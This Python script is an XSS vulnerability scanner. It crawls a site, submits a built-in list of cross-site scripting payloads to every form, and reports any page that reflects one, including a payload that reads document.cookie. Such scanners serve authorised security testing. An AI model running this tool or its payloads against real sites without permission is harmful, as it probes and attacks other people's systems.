import requests  # Importing requests library for making HTTP requests
from pprint import pprint  # Importing pprint for pretty-printing data structures
from bs4 import BeautifulSoup as bs  # Importing BeautifulSoup for HTML parsing
from urllib.parse import urljoin, urlparse  # Importing utilities for URL manipulation
from urllib.robotparser import RobotFileParser  # Importing RobotFileParser for parsing robots.txt files
from colorama import Fore, Style  # Importing colorama for colored terminal output
import argparse  # Importing argparse for command-line argument parsing

# List of XSS payloads to test forms with
XSS_PAYLOADS = [
    '"><svg/onload=alert(1)>',
    '\'><svg/onload=alert(1)>',
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '\'><img src=x onerror=alert(1)>',
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//--></script>",
    "<Script>alert('XSS')</scripT>",
    "<script>alert(document.cookie)</script>",
]
# global variable to store all crawled links
crawled_links = set()

def print_crawled_links():
    """
    Print all crawled links
    """
    print(f"\n[+] Links crawled:")
    for link in crawled_links:
        print(f"    {link}")
    print()


# Function to get all forms from a given URL
def get_all_forms(url):
    """Given a `url`, it returns all forms from the HTML content"""
    try:
        # Using BeautifulSoup to parse HTML content of the URL
        soup = bs(requests.get(url).content, "html.parser")
        # Finding all form elements in the HTML
        return soup.find_all("form")
    except requests.exceptions.RequestException as e:
        # Handling exceptions if there's an error in retrieving forms
        print(f"[-] Error retrieving forms from {url}: {e}")
        return []

# Function to extract details of a form
def get_form_details(form):
    """
    This function extracts all possible useful information about an HTML `form`
    """
    details = {}
    # Extracting form action and method
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    # Extracting input details within the form
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    # Storing form details in a dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

# Function to submit a form with a specific value
def submit_form(form_details, url, value):
    """
    Submits a form given in `form_details`
    Params:
    form_details (list): a dictionary that contains form information
    url (str): the original URL that contains that form
    value (str): this will be replaced for all text and search inputs
    Returns the HTTP Response after form submission
    """
    target_url = urljoin(url, form_details["action"])  # Constructing the absolute form action URL
    inputs = form_details["inputs"]
    data = {}
    # Filling form inputs with the provided value
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value
    try:
        # Making the HTTP request based on the form method (POST or GET)
        if form_details["method"] == "post":
            return requests.post(target_url, data=data)
        else:
            return requests.get(target_url, params=data)
    except requests.exceptions.RequestException as e:
        # Handling exceptions if there's an error in form submission
        print(f"[-] Error submitting form to {target_url}: {e}")
        return None
    
    
def get_all_links(url):
    """
    Given a `url`, it returns all links from the HTML content
    """
    try:
        # Using BeautifulSoup to parse HTML content of the URL
        soup = bs(requests.get(url).content, "html.parser")
        # Finding all anchor elements in the HTML
        return [urljoin(url, link.get("href")) for link in soup.find_all("a")]
    except requests.exceptions.RequestException as e:
        # Handling exceptions if there's an error in retrieving links
        print(f"[-] Error retrieving links from {url}: {e}")
        return []
    

# Function to scan for XSS vulnerabilities
def scan_xss(args, scanned_urls=None):
    """Given a `url`, it prints all XSS vulnerable forms and
    returns True if any is vulnerable, None if already scanned, False otherwise"""
    global crawled_links
    if scanned_urls is None:
        scanned_urls = set()
    # Checking if the URL is already scanned
    if args.url in scanned_urls:
        return
    # Adding the URL to the scanned URLs set
    scanned_urls.add(args.url)
    # Getting all forms from the given URL
    forms = get_all_forms(args.url)
    print(f"\n[+] Detected {len(forms)} forms on {args.url}")
    # Parsing the URL to get the domain
    parsed_url = urlparse(args.url)
    domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
    if args.obey_robots:
        robot_parser = RobotFileParser()
        robot_parser.set_url(urljoin(domain, "/robots.txt"))
        try:
            robot_parser.read()
        except Exception as e:
            # Handling exceptions if there's an error in reading robots.txt
            print(f"[-] Error reading robots.txt file for {domain}: {e}")
            crawl_allowed = False
        else:
            crawl_allowed = robot_parser.can_fetch("*", args.url)
    else:
        crawl_allowed = True
    if crawl_allowed or parsed_url.path:
        for form in forms:
            form_details = get_form_details(form)
            form_vulnerable = False
            # Testing each form with XSS payloads
            for payload in XSS_PAYLOADS:
                response = submit_form(form_details, args.url, payload)
                if response and payload in response.content.decode():
                    print(f"\n{Fore.GREEN}[+] XSS Vulnerability Detected on {args.url}{Style.RESET_ALL}")
                    print(f"[*] Form Details:")
                    pprint(form_details)
                    print(f"{Fore.YELLOW}[*] Payload: {payload} {Style.RESET_ALL}")
                    # save to a file if output file is provided
                    if args.output:
                        with open(args.output, "a") as f:
                            f.write(f"URL: {args.url}\n")
                            f.write(f"Form Details: {form_details}\n")
                            f.write(f"Payload: {payload}\n")
                            f.write("-"*50 + "\n\n")
                    form_vulnerable = True
                    break  # No need to try other payloads for this endpoint
            if not form_vulnerable:
                print(f"{Fore.MAGENTA}[-] No XSS vulnerability found on {args.url}{Style.RESET_ALL}")
    # Crawl links if the option is enabled
    if args.crawl:
        print(f"\n[+] Crawling links from {args.url}")
        try:
            # Crawling links from the given URL
            links = get_all_links(args.url)
        except requests.exceptions.RequestException as e:
            # Handling exceptions if there's an error in crawling links
            print(f"[-] Error crawling links from {args.url}: {e}")
            links = []
        for link in set(links):  # Removing duplicates
            if link.startswith(domain):
                crawled_links.add(link)
                if args.max_links and len(crawled_links) >= args.max_links:
                    print(f"{Fore.CYAN}[-] Maximum links ({args.max_links}) limit reached. Exiting...{Style.RESET_ALL}")
                    print_crawled_links()
                    exit(0)
                # Recursively scanning XSS vulnerabilities for crawled links
                args.url = link
                link_vulnerable = scan_xss(args, scanned_urls)
                if not link_vulnerable:
                    continue

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Extended XSS Vulnerability scanner script.")
    parser.add_argument("url", help="URL to scan for XSS vulnerabilities")
    parser.add_argument("-c", "--crawl", action="store_true", help="Crawl links from the given URL")
    # max visited links
    parser.add_argument("-m", "--max-links", type=int, default=0, help="Maximum number of links to visit. Default 0, which means no limit.")
    parser.add_argument("--obey-robots", action="store_true", help="Obey robots.txt rules")
    parser.add_argument("-o", "--output", help="Output file to save the results")
    args = parser.parse_args()
    scan_xss(args)  # Initiating XSS vulnerability scan

    print_crawled_links()
